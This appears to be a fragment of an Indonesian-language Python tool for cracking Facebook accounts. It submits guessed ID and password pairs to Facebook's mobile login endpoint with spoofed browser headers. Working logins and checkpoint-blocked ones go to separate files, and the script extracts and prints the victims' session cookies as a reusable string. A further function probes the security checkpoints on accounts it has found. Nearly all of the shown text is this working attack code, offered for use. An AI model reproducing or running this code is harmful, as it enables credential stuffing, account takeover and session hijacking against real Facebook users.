				"referer": f"https://mobile.facebook.com/login.php?skip_api_login=1&api_key=3618539641590455&kid_directed_site=0&app_id=3618539641590455&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D3618539641590455%26cbt%3D1696752891275%26e2e%3D%257B%2522init%2522%253A1696752891275%257D%26ies%3D1%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D26963441-e2bf-496f-97bf-2c6623861aed%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.netease.partyglobal%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DbZrS8Qf4YJl6Zmup0AMuKIP1g36luEnC6kIkQ3lDhqo%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De971aba2-6f14-44d0-98d3-44be37e9c6c8%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.netease.partyglobal%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": bahasa
			}
			po = ses.post("https://mobile.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=hider,allow_redirects=False)
			response=parser(po.text, "html.parser")
			if "checkpoint" in po.cookies.get_dict():
				cp+=1
				open('CP/'+cph,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{K}{idf} | {pw}{N}")
				tree.add(f"\r{P}Tahun : {B}{tahun(idf)}{N}")
				tree.add(f"\r{M}{ua}")
				prints(tree)
				break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				ok+=1
				open('OK/'+okh,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{H}{idf} | {pw}{N}")
				tree.add(f"\r{P}Tahun : {B}{tahun(idf)}{N}")
				tree.add(f"\r{H}{kuki}")
				prints(tree)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1

def ceker(idf,pw):
	sess=requests.Session()
	data={}
	data2={}
	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://m.facebook.com/","user-agent":"ua"})
	soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
	try:
		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
		responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
		cek=[cek.text for cek in responses.find_all("option")]
		if len(cek)==0:pass
		else:
			for opsi in range(len(cek)):ops.append(print(f" {xxx}{cek[opsi]}"))
	except:pass
	if len(ops)==0:pass
	print (' [+] Columns(ops)')
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))

###----------#[ CREAT FILE ]#----------###
#def memulai():
	try:os.mkdir('/sdcard/AKUN-OK')
	except:pass
	try:os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:os.mkdir('A2F')
	except:pass
	#login_baz()
if __name__=='__main__':
	#try:os.system('git pull')
	login()